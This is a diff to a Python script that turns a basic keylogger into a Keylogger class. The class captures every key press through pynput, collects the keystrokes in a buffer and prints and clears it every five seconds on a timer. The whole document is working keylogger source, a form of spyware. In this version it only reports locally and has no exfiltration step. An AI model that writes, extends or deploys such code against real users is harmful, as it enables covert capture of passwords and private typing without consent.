@@ -1,20 +1,36 @@
 #!/usr/bin/env python3
 
 import pynput.keyboard
+import threading
 
-log = ""
+class Keylogger:
+    def __init__(self):
+        self.log = ""
 
-def process_key_press(key):
-    global log
-    try:
-        log = log + str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log = log + " "
-        else:
-            log = log + " " + str(key) + " "
-    print(log)
+    def append_to_log(self, string):
+        self.log = self.log + string
 
-keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
-with keyboard_listener:
-    keyboard_listener.join()
+    def process_key_press(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        self.append_to_log((current_key))
+
+    def report(self):
+        print(self.log)
+        self.log = ""
+        timer = threading.Timer(5, self.report)
+        timer.start()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
+
+
+
